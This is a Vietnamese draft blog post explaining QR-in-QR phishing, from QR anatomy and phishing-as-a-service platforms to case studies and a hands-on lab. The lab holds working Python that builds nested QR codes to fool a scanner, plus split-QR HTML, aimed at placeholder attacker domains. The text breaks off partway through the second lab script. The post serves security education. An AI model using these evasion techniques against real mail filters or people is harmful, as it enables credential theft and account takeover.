---
title: QR-in-QR Phishing
published: 2026-04-22
tags: [Markdown]
category: Blog
draft: true
---


# QR-in-QR Phishing: Giải Phẫu Kỹ Thuật Tấn Công Thế Hệ Mới

## Mục lục

1. [QR Code là gì?](#1-qr-code-là-gì)
2. [Cấu tạo và cơ chế hoạt động](#2-cấu-tạo-và-cơ-chế-hoạt-động)
3. [Ứng dụng thực tế và điểm yếu bảo mật](#3-ứng-dụng-thực-tế-và-điểm-yếu-bảo-mật)
4. [Quishing — Khi QR trở thành vũ khí](#4-quishing--khi-qr-trở-thành-vũ-khí)
5. [Kỹ thuật QR-in-QR (Nested QR)](#5-kỹ-thuật-qr-in-qr-nested-qr)
6. [Hệ sinh thái kỹ thuật tấn công](#6-hệ-sinh-thái-kỹ-thuật-tấn-công)
7. [Nền tảng PhaaS đứng sau](#7-nền-tảng-phaas-đứng-sau)
8. [Case Studies thực tế](#8-case-studies-thực-tế)
9. [Pentest Lab — Hướng dẫn thực hành](#9-pentest-lab--hướng-dẫn-thực-hành)
10. [Chiến lược phòng thủ](#10-chiến-lược-phòng-thủ)
11. [Kết luận và xu hướng 2026](#11-kết-luận-và-xu-hướng-2026)
12. [Tài liệu tham khảo](#12-tài-liệu-tham-khảo)

---

## 1. QR Code là gì?

**QR Code** (Quick Response Code) là loại mã vạch 2 chiều được phát triển năm **1994** bởi kỹ sư Masahiro Hara tại công ty **Denso Wave** (Nhật Bản), ban đầu phục vụ theo dõi linh kiện ô tô trong dây chuyền sản xuất Toyota. Tên gọi "Quick Response" xuất phát từ khả năng đọc tốc độ cao — thiết kế để dây chuyền sản xuất scan nhanh mà không cần canh chỉnh hướng như mã vạch 1D truyền thống.

Khác với barcode thông thường chỉ chứa tối đa ~20 ký tự số theo chiều ngang, QR code mã hóa dữ liệu theo **cả hai chiều** (ngang + dọc), cho phép lưu trữ đến **7.089 ký tự số** hoặc **4.296 ký tự alphanumeric** trong một hình vuông nhỏ.

### Tại sao QR code bùng nổ trở lại sau 2020?

QR code tồn tại từ 1994 nhưng chưa phổ biến với người dùng phổ thông cho đến khi đại dịch COVID-19 (2020) thúc đẩy nhu cầu "không chạm" toàn cầu. Các nhà hàng thay menu giấy bằng QR, bệnh viện dùng QR check-in, chính phủ dùng QR cho vaccine certificate. Thói quen quét QR được thiết lập rộng rãi — và đây chính xác là điều kẻ tấn công khai thác.

> 📊 Năm 2025, **41,77 triệu lượt quét QR** được ghi nhận toàn cầu — tăng gấp 4 lần so với 2021. Gần **2% trong số đó là mã QR độc hại**.

---

## 2. Cấu tạo và cơ chế hoạt động

Một mã QR không phải ma trận ô ngẫu nhiên — mỗi vùng có chức năng kỹ thuật riêng biệt. Hiểu cấu trúc này là nền tảng để hiểu tại sao kỹ thuật QR-in-QR có thể đánh lừa scanner.

### 2.1 Các thành phần chính

```
┌─────────────────────────────────────────────┐
│ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ │  ← Quiet Zone
│ ░ ███████ ░░░░░░░░░░░ ███████ ░░░░░░░░░░░░ │
│ ░ █     █ ░░░░░░░░░░░ █     █ ░░░░░░░░░░░░ │
│ ░ █ ███ █ ░ [Format] ░ █ ███ █ ░░░░░░░░░░░░ │  ← Finder Patterns
│ ░ █ ███ █ ░░░░░░░░░░░ █ ███ █ ░░░░░░░░░░░░ │    (3 góc)
│ ░ █     █ ░░░░░░░░░░░ █     █ ░░░░░░░░░░░░ │
│ ░ ███████ ░░░░░░░░░░░ ███████ ░░░░░░░░░░░░ │
│ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ │
│ ░ █░█░█░█ [Timing] ░░░░░░░░░░░░░░░░░░░░░░░ │  ← Timing Patterns
│ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ │
│ ░ ███████ ░░   DATA MODULES   ░░ [Align] ░░ │  ← Alignment Pattern
│ ░ █     █ ░░   (dữ liệu +    ░░░░░░░░░░░░ │
│ ░ █ ███ █ ░░   error correct) ░░░░░░░░░░░░ │
│ ░ █     █ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ │
│ ░ ███████ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ │
│ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ │
└─────────────────────────────────────────────┘
```

**① Finder Pattern (3 góc vuông lồng nhau)**
3 hình vuông đặc trưng ở 3 góc của QR (trừ góc dưới phải). Đây là thành phần **quan trọng nhất** — cho phép scanner nhận diện và định hướng QR từ mọi góc độ, kể cả khi ảnh bị nghiêng hay méo. Scanner bắt đầu decode từ đây.

**② Alignment Pattern**
Xuất hiện từ version 2 trở lên. Giúp scanner hiệu chỉnh khi QR bị biến dạng (cong, méo do chụp từ góc). Số lượng alignment pattern tăng theo version.

**③ Timing Pattern**
Chuỗi ô đen/trắng xen kẽ chạy ngang và dọc giữa 2 finder pattern. Giúp scanner xác định kích thước module và vị trí data cells.

**④ Format Information**
Lưu trữ loại error correction (L/M/Q/H) và mask pattern. Scanner đọc thông tin này **đầu tiên** để biết cách giải mã phần dữ liệu.

**⑤ Data & Error Correction Modules**
Phần còn lại chứa dữ liệu đã mã hóa Reed-Solomon. Error correction cho phép QR vẫn đọc được dù bị che khuất hoặc hư hỏng một phần.

**⑥ Quiet Zone**
Vùng trắng tối thiểu 4 module viền quanh QR. **Bắt buộc** để scanner không nhầm lẫn với nội dung xung quanh.

### 2.2 Các phiên bản (Version) và dung lượng

QR code có **40 version**, kích thước tăng từ 21×21 đến 177×177 module:

| Version | Kích thước | Dung lượng số | Dung lượng text | Dùng cho |
|---------|-----------|--------------|----------------|----------|
| 1 | 21×21 | 41 | ~17 ký tự | Số điện thoại ngắn |
| 3 | 29×29 | 127 | ~53 ký tự | URL rút gọn |
| 7 | 45×45 | 510 | ~196 ký tự | URL thông thường |
| 10 | 57×57 | 914 | ~346 ký tự | URL dài + tham số |
| 20 | 97×97 | 3.391 | ~1.270 ký tự | Văn bản, thông tin |
| 40 | 177×177 | 7.089 | ~4.296 ký tự | Dữ liệu lớn |

### 2.3 Error Correction Level — chi tiết kỹ thuật quan trọng

| Level | Ký hiệu | Phục hồi được | Khi nào dùng |
|-------|---------|--------------|--------------|
| Low | L | ~7% | Môi trường sạch, in chất lượng cao |
| Medium | M | ~15% | Mặc định hầu hết ứng dụng |
| Quartile | Q | ~25% | Công nghiệp, có thể bị bẩn |
| **High** | **H** | **~30%** | **Logo nhúng vào QR, quảng cáo ngoài trời** |

> ⚠️ **Liên quan trực tiếp đến tấn công:** Kẻ tấn công tạo QR-in-QR **bắt buộc dùng ECC Level H** cho outer QR. Vì inner QR che khuất trung tâm outer QR (~25–30% diện tích), outer QR vẫn decode được nhờ Error Correction 30%. Đây không phải trùng hợp — đây là lựa chọn kỹ thuật có chủ đích.

---

## 3. Ứng dụng thực tế và điểm yếu bảo mật

### 3.1 QR code được dùng ở đâu?

| Lĩnh vực | Ứng dụng cụ thể | Mức độ phổ biến |
|----------|----------------|----------------|
| Nhà hàng / F&B | Menu, đặt món, thanh toán | ⭐⭐⭐⭐⭐ |
| Thanh toán | VietQR, QR Pay, WeChat Pay, Alipay | ⭐⭐⭐⭐⭐ |
| Vé điện tử | Boarding pass, concert, sự kiện | ⭐⭐⭐⭐ |
| Xác thực (MFA) | Google Authenticator setup, Signal device link | ⭐⭐⭐⭐ |
| Logistics | Tracking, kho bãi, truy xuất nguồn gốc | ⭐⭐⭐⭐ |
| Marketing | Link download app, landing page, danh thiếp | ⭐⭐⭐ |
| Y tế | Vaccine certificate, check-in bệnh viện | ⭐⭐⭐ |

### 3.2 Điểm yếu bảo mật vốn có — so sánh với hyperlink

| Đặc điểm | Hyperlink thông thường | QR Code |
|----------|----------------------|---------|
| Người dùng thấy URL trước khi truy cập | ✅ Có (hover preview) | ❌ Không — bị ẩn hoàn toàn |
| Thiết bị xử lý | Máy tính (có EDR, proxy) | Điện thoại cá nhân (thường không có) |
| Bị chặn bởi email filter | ✅ URL được quét trực tiếp | ❌ Phải decode ảnh trước |
| Người dùng có thể kiểm tra | ✅ Copy URL, check domain | ❌ Không có cách nào trước khi quét |
| Thay đổi đích sau khi tạo | Chỉ nếu dùng redirect | ✅ Dễ qua URL shortener |
| Nhận thức người dùng về nguy cơ | Cao — được giáo dục nhiều | Thấp — thói quen "cứ quét" |

> 💡 **Điểm mù tâm lý:** Người dùng đã hình thành phản xạ quét QR mà không do dự (menu, vé, thanh toán). Kẻ tấn công khai thác chính phản xạ này — nhận QR từ email "công ty" → quét ngay.

---

## 4. Quishing — Khi QR trở thành vũ khí

**Quishing** (QR + Phishing) là kỹ thuật tấn công sử dụng mã QR để phân phối URL độc hại, dụ nạn nhân truy cập trang giả mạo nhằm đánh cắp thông tin đăng nhập hoặc dữ liệu tài chính.

### 4.1 Tại sao kẻ tấn công chọn QR thay vì URL trực tiếp?

**① Bypass email scanner**
URL dạng text bị email gateway quét và blocklist ngay lập tức. QR code là ảnh — hệ thống phải decode ảnh, extract URL, rồi mới phân tích. Nhiều hệ thống bỏ qua hoàn toàn bước decode QR.

**② Chuyển sang thiết bị không được bảo vệ**
Quét QR = chuyển từ máy tính công ty (có EDR, proxy, policy) sang điện thoại cá nhân. Điện thoại cá nhân thường thiếu: endpoint security, corporate proxy, MDM enforcement.

**③ Không có URL preview**
Với hyperlink, người dùng hover để thấy URL trước khi click. Với QR — không có cách nào kiểm tra đích đến mà không quét. Đây là điểm mù tâm lý quan trọng nhất.

**④ Tận dụng thói quen đã hình thành**
Quét QR = hành động tự nhiên không cần suy nghĩ. Attacker lợi dụng phản xạ này.

### 4.2 Timeline tiến hóa của Quishing

**2021 — Giai đoạn sơ khai (0.8%)**
QR đơn giản nhúng URL trực tiếp trong email. Hầu hết scanner chưa xử lý được QR. Tấn công còn thủ công, chưa tự động hóa.

**2023 — Bùng nổ (tăng 433%, chiếm 12.4% tổng phishing)**
PhaaS platforms (Tycoon 2FA, Greatness) tích hợp QR để bypass MFA qua AiTM. Executive bị nhắm 42 lần nhiều hơn nhân viên. 5.063 sự cố được ghi nhận chỉ trong tháng 6/2023.

**2024 — QR trong PDF attachment**
Barracuda phát hiện hơn 500.000 email phishing nhúng QR trong PDF — thêm một tầng bypass. ASCII QR code (dùng ký tự Unicode thay ảnh) xuất hiện để qua mặt OCR scanner.

**2025 — Thế hệ mới: Split QR & Nested QR-in-QR**
Gabagool PhaaS ra mắt Split QR (tách 2 ảnh). Tycoon 2FA triển khai Nested QR-in-QR. Đây là trọng tâm của bài nghiên cứu này.

**2026 — AI-powered Quishing**
Tycoon 2FA bị triệt phá (3/2026). AI tự động hóa tạo nested QR cá nhân hóa. Quishing kết hợp deepfake audio/video. QR trong physical world (dán đè lên QR thật ở nhà hàng, ATM) mở rộng attack surface.

### 4.3 Thống kê chính (2021–2026)

| Chỉ số | Giá trị | Nguồn |
|--------|---------|-------|
| Tăng trưởng quishing 2021→2023 | **+433%** | Recorded Future, 2024 |
| Tỷ lệ phishing dùng QR (2025) | **12%** tổng tấn công | Keepnet Labs, 2025 |
| Email QR-in-PDF phát hiện mid-2024 | **>500.000** email | Barracuda Networks, 2024 |
| Executive bị nhắm nhiều hơn nhân viên | **42 lần** | Keepnet Labs, 2025 |
| Thiệt hại trung bình mỗi sự cố doanh nghiệp | **>$1 triệu** | Keepnet Labs, 2025 |
| Tỷ lệ sự cố được báo cáo đúng | chỉ **36%** | Keepnet Labs, 2025 |
| Quishing tăng trưởng hàng năm (2025) | **+25% YoY** | Keepnet Labs, 2025 |
| QR shortener traffic H1 2023 → H1 2024 | **+55%** | Palo Alto Unit 42, 2026 |

---

## 5. Kỹ thuật QR-in-QR (Nested QR Code)

Đây là kỹ thuật trọng tâm của nghiên cứu: **nhúng một mã QR độc hại bên trong hoặc xung quanh một mã QR hợp lệ**, tạo ra sự mơ hồ lừa được cả hệ thống bảo mật lẫn người dùng. Kỹ thuật này được xác nhận do **Tycoon 2FA PhaaS** triển khai trong thực tế.

### 5.1 Cấu trúc kỹ thuật

```
┌──────────────────────────────────────────────────┐
│         OUTER QR (độc hại — ECC Level H)          │
│    Trỏ đến: https://attacker.com/steal-creds      │
│                                                    │
│   ┌────────────────────────────────────────┐      │
│   │     INNER QR (hợp lệ — sắc nét)        │      │
│   │     Trỏ đến: https://google.com        │      │
│   │     (finder pattern rõ ràng hơn)       │      │
│   └────────────────────────────────────────┘      │
│                                                    │
└──────────────────────────────────────────────────┘
          ↓                           ↓
   Camera điện thoại           Email scanner
   → đọc OUTER QR              → đọc INNER QR
   → phishing page             → google.com ✅
   ❌ Nạn nhân bị lừa          → FALSE NEGATIVE
```

### 5.2 Tại sao camera điện thoại đọc outer còn scanner đọc inner?

Đây là điểm mấu chốt kỹ thuật:

**Email scanner (phân tích tĩnh):** Xử lý hình ảnh 2D phẳng từ góc cố định. Khi có hai finder pattern chồng lên nhau, thuật toán ưu tiên pattern nào rõ ràng hơn trong không gian pixel 2D. Kẻ tấn công **chủ đích thiết kế** inner QR có finder pattern sắc nét hơn → scanner chọn inner (google.com) → false negative.

**Camera điện thoại (real-time):** Dùng autofocus và perspective correction động. Ở nhiều góc nghiêng thực tế của người dùng, outer QR chiếm phần lớn frame. Ngoài ra, outer QR được build với **ECC Level H** — có thể decode dù inner QR che khuất đến 30% diện tích trung tâm.

### 5.3 Luồng tấn công từng bước

**Bước 1 — Chuẩn bị:**
Tạo outer QR (version cao, ECC Level H) chứa URL phishing. Tạo inner QR (finder pattern sắc nét, size ~30–35% outer). Paste inner vào trung tâm outer.

**Bước 2 — Delivery:**
Email giả mạo Microsoft/DocuSign/Adobe + urgency ("hết hạn 24h"). QR thường nhúng trong PDF attachment để thêm một tầng bypass scanner.

**Bước 3 — Scanner bị đánh lừa:**
Email security decode QR → thấy google.com → đánh dấu SAFE. (Xác nhận bằng thực nghiệm lab — xem Phần 9.)

**Bước 4 — Nạn nhân quét:**
Camera điện thoại đọc outer QR → redirect phishing → nhập credentials + MFA token.

**Bước 5 — Account Takeover:**
AiTM proxy relay MFA token trong real-time trước khi hết hạn → chiếm quyền tài khoản.

### 5.4 Tại sao đây là bước ngoặt kỹ thuật?

QR-in-QR không chỉ là một kỹ thuật bypass thông thường — nó đảo ngược hoàn toàn logic bảo mật truyền thống: **thứ được xem là bằng chứng an toàn (inner QR → google.com) chính là vỏ bọc cho mối đe dọa thực**. Scanner không thể tin vào kết quả decode của chính nó nữa.

---

## 6. Hệ sinh thái kỹ thuật tấn công

QR-in-QR là kỹ thuật tinh vi nhất, nhưng nằm trong hệ sinh thái rộng hơn:

### 6.1 Split QR Code (Gabagool PhaaS)

**Cơ chế:** QR bị tách thành 2 ảnh PNG/JPEG riêng biệt, nhúng liên tiếp trong email HTML. Scanner thấy 2 ảnh độc lập (vô hại). Khi render trong email client, 2 ảnh ghép nhau thành QR hoàn chỉnh.

```html
<!-- Email HTML thực tế của Gabagool -->
<!-- Scanner thấy: 2 ảnh PNG riêng lẻ, không decode được -->
<!-- Người dùng thấy: 1 QR code hoàn chỉnh               -->
<div style="display:inline-block">
  <img src="qr_top_half.png" style="display:block; margin:0">
  <img src="qr_bot_half.png" style="display:block; margin:0">
</div>
```

**Tại sao bypass:** Scanner email xử lý từng ảnh độc lập, không reconstruct composite. Không có QR hoàn chỉnh để decode và kiểm tra URL.

### 6.2 ASCII / UTF-8 QR Code

**Cơ chế:** QR được xây dựng từ ký tự Unicode block (█ ▀ ▄ ░ ▌...) thay vì file ảnh. OCR engine nhìn thấy text; mắt người nhìn thấy QR.

```
█▀▀▀▀▀█ ▀█▀ ▄▄  █▀▀▀▀▀█
█ ███ █ ▀▀▄█▀▀  █ ███ █
█ ▀▀▀ █ █▀▀ ▀   █ ▀▀▀ █
▀▀▀▀▀▀▀ █ █ ▀   ▀▀▀▀▀▀▀
         ↑
   OCR thấy: "text characters" — không phải QR image
```

### 6.3 QR + URL Shortener (Dynamic Redirect)

**Cơ chế:** QR trỏ đến URL shortener (bit.ly, qr.io...). Kẻ tấn công **thay đổi destination URL bất kỳ lúc nào** sau khi email đã gửi. Email qua filter khi URL còn "sạch" — sau đó đổi sang phishing page.

**Tại sao bypass:** URL shortener mang reputation của dịch vụ uy tín. Blocklist URL tại thời điểm scan là safe → email được gửi đi. Unit 42 ghi nhận QR shortener traffic tăng +55% từ H1 2023 → H1 2024.

### 6.4 QR + Cloudflare Turnstile (Anti-Crawler)

**Cơ chế:** Trang phishing đặt sau CAPTCHA Cloudflare Turnstile. Security crawler tự động bị chặn. Chỉ người dùng thật mới thấy trang giả mạo.

### 6.5 QR + In-App Deep Link (Mobile Targeting)

**Cơ chế:** QR trỏ deep link vào tính năng cụ thể của app: `signal://linkdevice?...`, `tg://login?...`, banking app payment... Khai thác tính năng **hợp lệ** của app để thực hiện unauthorized action.

---

## 7. Nền tảng PhaaS đứng sau

Quishing được thương mại hóa qua **Phishing-as-a-Service (PhaaS)** — nền tảng cung cấp toàn bộ toolchain theo mô hình đăng ký $100–$1.000/tháng. Bất kỳ ai cũng có thể triển khai chiến dịch tinh vi.

### 7.1 Bảng so sánh các PhaaS chính

| Platform | Kỹ thuật QR | MFA Bypass | Mục tiêu | Giá (approx.) | Trạng thái (4/2026) |
|----------|------------|-----------|---------|--------------|-------------------|
| **Tycoon 2FA** | Nested QR-in-QR | AiTM + Cookie theft | Microsoft 365, Gmail | ~$120/tháng | ⛔ Triệt phá 3/2026 |
| **Gabagool** | Split QR (2 PNG) | Credential harvest | Microsoft accounts | ~$150/tháng | 🔴 Còn hoạt động |
| **Greatness** | QR in email body | AiTM | Microsoft 365 | ~$120/tháng | 🔴 Còn hoạt động |
| **Sneaky 2FA** | QR + domain cloaking | AiTM proxy | O365, Gmail (targeted) | ~$500/tháng | 🟠 Đang mở rộng |

### 7.2 Deep-dive: Tycoon 2FA

Tycoon 2FA (active từ tháng 8/2023) là AiTM reverse proxy — đứng giữa nạn nhân và Microsoft/Google server thật, relay credentials real-time, đánh cắp session cookie sau khi MFA hoàn thành.

**Quy mô trước khi bị triệt phá:**
- Tháng 2/2026: hơn **3 triệu tin nhắn phishing** trong một tháng (Proofpoint)
- Điểm nguy cơ: **4.8/5** — cao nhất trong 11 AiTM kit theo dõi (Sekoia TDR)
- **64.000+ incidents** ghi nhận năm 2025 (Any.run)
- **99% tổ chức** trải qua account takeover attempt năm 2025; **59% ATO thành công dù có MFA** (Proofpoint)

**Liên minh triệt phá (3/2026):** Proofpoint + Microsoft + Europol + Cloudflare + Coinbase + Shadowserver Foundation + 6 tổ chức khác.

### 7.3 Cơ chế AiTM — Tại sao MFA bị vô hiệu hóa

```
Nạn nhân ──→ [Tycoon 2FA Proxy] ──→ Microsoft Server thật
              ↓ Intercept real-time:
         username + password      ← bị đánh cắp #1
              ↓ Forward → nhận MFA challenge
         MFA code (6 chữ số)      ← bị đánh cắp #2
              ↓ Forward → nhận session
         session cookie           ← bị đánh cắp #3  ← KEY

# Session cookie = vào thẳng M365 không cần password hay MFA nữa
# Attacker có thể đăng nhập từ bất kỳ đâu, bất kỳ lúc nào
```

---

## 8. Case Studies thực tế

### Case 1: Sophos Employee Attack (2024)

**Bối cảnh:** Nhân viên Sophos — công ty an ninh mạng — nhận email giả về quyền lợi hưu trí.

**Diễn biến:** Email chứa PDF attachment với QR code và thông báo *"tài liệu hết hạn trong 24 giờ"*. Nhân viên quét QR bằng điện thoại cá nhân. Attacker relay MFA token **trong real-time** để truy cập ứng dụng nội bộ. Các kiểm soát bổ sung của Sophos ngăn được thiệt hại lớn hơn, nhưng credentials + MFA token đã bị đánh cắp thành công.

**Bài học:** Ngay cả nhân viên công ty bảo mật cũng bị lừa. Urgency (24h) + PDF attachment + QR là combo social engineering cực kỳ hiệu quả.

---

### Case 2: Microsoft Password Reset — Gabagool Split QR (2025)

**Bối cảnh:** Chiến dịch quy mô lớn nhắm vào tài khoản Microsoft 365 doanh nghiệp.

**Diễn biến:** Gabagool PhaaS được thuê triển khai. Attacker trước đó dùng **conversation hijacking** để cá nhân hóa email trong context trao đổi thực tế của nạn nhân. Email giả "đặt lại mật khẩu Microsoft" chứa Split QR (2 ảnh PNG). Scanner email thấy 2 PNG vô hại → PASS. Người dùng thấy QR hoàn chỉnh → quét → trang thu thập credentials Microsoft 365.

**Kỹ thuật đặc biệt:** Conversation hijacking làm tăng đáng kể độ tin cậy — nạn nhân nhận email trong context trao đổi họ biết là thật.

---

### Case 3: Signal Account Hijacking — Nga-Ukraine (2024–2025)

**Bối cảnh:** Google GTIG ghi nhận nhóm UAC-0185 (liên kết Nga) nhắm vào người dùng Signal Ukraine.

**Diễn biến:** QR giả mạo tính năng hợp lệ "link devices" của Signal. Phân phối qua email, Telegram, hoặc nhúng trong trang web giả mạo tài liệu quân sự. Khi nạn nhân quét, thiết bị attacker được liên kết vào tài khoản Signal → nhận toàn bộ tin nhắn real-time mà không cần mật khẩu.

**Mục tiêu:** Thông tin liên lạc quân sự và tình báo. CERT-UA xác nhận nhiều nhóm tấn công dùng kỹ thuật này.

---

### Case 4: Healthcare Credential Harvesting (2024–2025)

**Bối cảnh:** Chiến dịch nhắm vào nhân viên y tế, phát hiện bởi Paubox.

**Diễn biến:** Email giả Adobe Acrobat Sign và DocuSign với logo, HR contact đầy đủ. PDF attachment chứa QR (thay vì link trực tiếp). QR trỏ qua chuỗi redirect ẩn destination thực sự. Trang phishing dùng Cloudflare Turnstile chặn security crawler.

**Thiệt hại:** Chi phí data breach ngành healthcare năm 2025: **$11 triệu trung bình** — cao nhất mọi ngành, **14 năm liên tiếp** (Paubox, 2025).

---

## 9. Pentest Lab — Hướng dẫn thực hành

> ⚠️ **Disclaimer pháp lý và đạo đức:**
> Toàn bộ lab chỉ thực hiện trong môi trường cô lập, phục vụ mục đích nghiên cứu và giáo dục bảo mật. Mọi URL dùng domain `.lab` không tồn tại trên internet. **Tuyệt đối không** sử dụng trên hệ thống hoặc người dùng thực. Làm vậy là vi phạm pháp luật.

### Yêu cầu môi trường

```bash
# Hệ điều hành: Ubuntu 22.04 / Kali Linux / macOS / WSL2
# Python 3.10+

# Tạo thư mục làm việc
mkdir ~/qr-lab && cd ~/qr-lab
mkdir output

# Virtual environment
python3 -m venv venv
source venv/bin/activate      # Linux/macOS
# venv\Scripts\activate       # Windows

# Cài dependencies
pip install qrcode[pil] pillow pyzbar

# Cài thư viện native (bắt buộc cho pyzbar)
sudo apt install libzbar0 -y   # Ubuntu/Kali
# brew install zbar            # macOS
```

---

### Lab 1: Nested QR-in-QR — Xác nhận False Negative

**Mục tiêu:** Tự tay tạo QR-in-QR và chứng minh scanner `pyzbar` bị đánh lừa bằng kết quả thực nghiệm.

**Tạo file:**

```bash
nano ~/qr-lab/lab1.py
```

**Nội dung script:**

```python
import qrcode
from PIL import Image
from pyzbar.pyzbar import decode
import json, os

os.makedirs("output", exist_ok=True)

# ── Tham số ──────────────────────────────────────────────────
INNER_URL = "https://google.com"                    # QR hợp lệ (inner)
OUTER_URL = "https://evil.attacker.lab/steal-creds" # QR độc hại (outer)
# ─────────────────────────────────────────────────────────────

def make_qr(url, version, box_size,
            ecc=qrcode.constants.ERROR_CORRECT_H):
    """Tạo QR PIL Image từ URL"""
    qr = qrcode.QRCode(
        version=version,
        error_correction=ecc,
        box_size=box_size,
        border=4
    )
    qr.add_data(url)
    qr.make(fit=True)
    return qr.make_image(
        fill_color="black", back_color="white"
    ).convert("RGB")

def scan(img):
    """Decode tất cả QR trong ảnh, trả về list URL"""
    return [r.data.decode() for r in decode(img)]

print("=" * 55)
print("LAB 1: QR-in-QR Scanner Behavior")
print("=" * 55)

# ── STEP 1: QR đơn (baseline) ─────────────────────────────
print("\n[STEP 1] Tạo QR đơn (baseline)...")
single = make_qr(OUTER_URL, version=3, box_size=10)
single = single.resize((300, 300))
single.save("output/lab1_single.png")
result_single = scan(single)
print(f"  Saved : output/lab1_single.png")
print(f"  Decode: {result_single[0]}")
print(f"  → Scanner thấy URL độc hại: ✅ EXPECTED")

# ── STEP 2: Tạo Nested QR ─────────────────────────────────
print("\n[STEP 2] Tạo Nested QR-in-QR...")

# Outer QR: version cao, ECC Level H (chịu được 30% bị che)
outer = make_qr(OUTER_URL, version=5, box_size=10)
outer = outer.resize((300, 300))

# Inner QR: nhỏ hơn (~33% outer), finder pattern sắc nét
inner = make_qr(INNER_URL, version=2, box_size=8)
inner = inner.resize((100, 100))

# Paste inner vào chính giữa outer
x = (300 - 100) // 2  # = 100
y = (300 - 100) // 2  # = 100
outer.paste(inner, (x, y))
outer.save("output/lab1_nested.png")

print(f"  Outer QR: version=5, ECC=H, size=300x300")
print(f"  Inner QR: version=2, ECC=H, size=100x100")
print(f"  Paste at: ({x}, {y}) — chính giữa outer")
print(f"  Inner chiếm {round(100*100/(300*300)*100, 1)}% diện tích outer")

# ── STEP 3: Scanner test ───────────────────────────────────
print("\n[STEP 3] Chạy pyzbar scanner trên Nested QR...")
result_nested = scan(outer)

print("\n" + "─" * 55)
print("KẾT QUẢ:")
print("─" * 55)
print(f"QR đơn   → {result_single[0]}")

if result_nested:
    url = result_nested[0]
    print(f"Nested   → {url}")

    if "google" in url:
        print("\n🔴 FALSE NEGATIVE CONFIRMED!")
        print(f"   Scanner đọc INNER (legit) : {url}")
        print(f"   Scanner BỎ QUA OUTER      : {OUTER_URL}")
        print(f"   → Email security đánh dấu 'SAFE' ← mục tiêu của attacker")
    else:
        print(f"\n⚠️  Scanner đọc outer (unexpected cho kỹ thuật này)")
else:
    print("Nested   → NOTHING DECODED (ambiguous)")
    print("\n⚠️  SCAN AMBIGUITY — scanner bị confuse hoàn toàn")

# ── STEP 4: Thử tỷ lệ inner/outer khác nhau ───────────────
print("\n[STEP 4] Thử inner size khác nhau (quan sát threshold)...")

for size in [60, 80, 100, 120, 140]:
    ratio = size / 300
    o_test = make_qr(OUTER_URL, version=5, box_size=10).resize((300,300))
    i_test = make_qr(INNER_URL, version=2, box_size=8).resize((size,size))
    px = (300 - size) // 2
    o_test.paste(i_test, (px, px))
    o_test.save(f"output/lab1_size_{size}.png")
    r = scan(o_test)
    decoded = r[0][:35] if r else "AMBIGUOUS"
    bypass = "✅ scanner bị lừa" if "google" in decoded or decoded == "AMBIGUOUS" else "❌ outer detected"
    print(f"  inner={size}px ({int(ratio*100)}%): {decoded}... → {bypass}")

# ── STEP 5: Test ECC Level ảnh hưởng thế nào ──────────────
print("\n[STEP 5] Test ECC Level (L vs M vs H)...")
import qrcode.constants as c

for name, level in [("L-7pct",  c.ERROR_CORRECT_L),
                    ("M-15pct", c.ERROR_CORRECT_M),
                    ("H-30pct", c.ERROR_CORRECT_H)]:
    o_ecc = make_qr(OUTER_URL, 5, 10, ecc=level).resize((300,300))
    i_ecc = make_qr(INNER_URL, 2, 8).resize((100,100))
    o_ecc.paste(i_ecc, (100,100))
    o_ecc.save(f"output/lab1_ecc_{name}.png")
    r = scan(o_ecc)
    decoded = r[0][:35] if r else "DECODE FAILED"
    print(f"  ECC {name}: outer decode = '{decoded}'")

# ── Lưu report ─────────────────────────────────────────────
report = {
    "single_result":  result_single,
    "nested_result":  result_nested,
    "false_negative": result_nested == [INNER_URL] if result_nested else False,
    "conclusion": "pyzbar reads inner (legit) QR, ignores outer (malicious)"
}
with open("output/lab1_report.json", "w") as f:
    json.dump(report, f, indent=2)

print(f"\n✅ Files saved: output/lab1_*.png")
print(f"✅ Report    : output/lab1_report.json")
```

**Chạy lab:**

```bash
cd ~/qr-lab
python3 lab1.py
```

**Output mong đợi:**

```
KẾT QUẢ:
───────────────────────────────────────────────────────
QR đơn   → https://evil.attacker.lab/steal-creds
Nested   → https://google.com

🔴 FALSE NEGATIVE CONFIRMED!
   Scanner đọc INNER (legit) : https://google.com
   Scanner BỎ QUA OUTER      : https://evil.attacker.lab/steal-creds
   → Email security đánh dấu 'SAFE' ← mục tiêu của attacker

[STEP 5] Test ECC Level:
  ECC L-7pct  : outer decode = 'DECODE FAILED'   ← outer bị hỏng khi inner che
  ECC M-15pct : outer decode = 'DECODE FAILED'   ← vẫn không đủ
  ECC H-30pct : outer decode = '...'             ← chỉ H mới decode được
```

**Quan sát ảnh:**

```bash
# Linux
eog output/lab1_single.png output/lab1_nested.png &

# macOS
open output/lab1_nested.png
```

> 📝 **Điều cần ghi nhận:** Ảnh `lab1_nested.png` trông như một QR bình thường. Bạn thấy pattern phức tạp hơn ở giữa nhưng không nhận ra đó là 2 QR lồng nhau — đây là lý do người dùng không phát hiện được. ECC Level H là **bắt buộc**: với Level L và M, outer QR không decode được vì inner che quá nhiều.

---

### Lab 2: Split QR — Gabagool PhaaS Technique

**Mục tiêu:** Tái hiện kỹ thuật tách QR thành 2 ảnh để bypass scanner, tạo email HTML demo.

**Tạo file:**

```bash
nano ~/qr-lab/lab2.py
```

**Nội dung script:**

```python
import qrcode
from PIL import Image
from pyzbar.pyzbar import decode
import os

os.makedirs("output", exist_ok=True)

TARGET_URL = "https://phishing.attacker.lab/ms-login"

def make_qr(url, version, box_size):
    qr = qrcode.QRCode(
        version=version,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=box_size,
        border=4
    )
    qr.add_data(url)
    qr.make(fit=True)
    return qr.make_image(
        fill_color="black", back_color="white"
    ).convert("RGB")

def scan(img):
    r = decode(img)
    return r[0].data.decode() if r else None

print("=" * 55)
print("LAB 2: Split QR Code (Gabagool PhaaS Technique)")
print("=" * 55)

# ── Tạo QR đầy đủ ─────────────────────────────────────────
print("\n[1] Tạo QR đầy đủ...")
full = make_qr(TARGET_URL, version=4, box_size=12)
full = full.resize((300, 300))
full.save("output/lab2_full.png")
print(f"  Size   : {full.size}")
print(f"  Decode : {scan(full)}")

